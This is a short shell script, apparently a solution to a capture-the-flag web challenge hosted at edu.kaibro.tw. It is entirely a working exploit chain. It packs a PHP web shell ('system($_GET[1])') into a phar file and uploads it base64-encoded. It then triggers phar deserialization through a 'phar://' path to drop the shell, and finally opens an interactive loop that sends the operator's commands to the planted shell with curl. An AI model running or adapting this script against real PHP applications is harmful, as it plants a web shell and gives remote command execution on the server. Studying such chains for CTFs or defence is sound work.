#!/bin/sh

# $1: file
# $2: content
set -- "${1:-RB.php}" "${2:-<?php system($_GET[1]); ?>}"

# product phar file

php product.php $1 $2

exp=$(cat avatar.phar|base64)

# insert a phar contain a serialized object
obj_path=`curl -X POST "http://edu.kaibro.tw:12345?action\[\]=upload" --data-urlencode "c=$exp" | grep "img src"| sed "s/^.*<img src='//" | sed "s/'>//"`
echo $obj_path

# call the object up
call=`curl -X POST "http://edu.kaibro.tw:12345/?action\[\]=getsize" --data "f=phar:///var/www/html/$obj_path/file.php"`
echo $call

url='http://edu.kaibro.tw:12345/uploads/RB.php?1'
user=`curl $url=whoami `
host=`curl $url=hostname `

while true; do
	echo "$user@$host$ \c"
	read cmd

	cmd=`echo $cmd | sed "s/ /%20/g"`

	if [ "$cmd" = 'exit' ] ; then
		break
	fi

	curl $url=$cmd
done
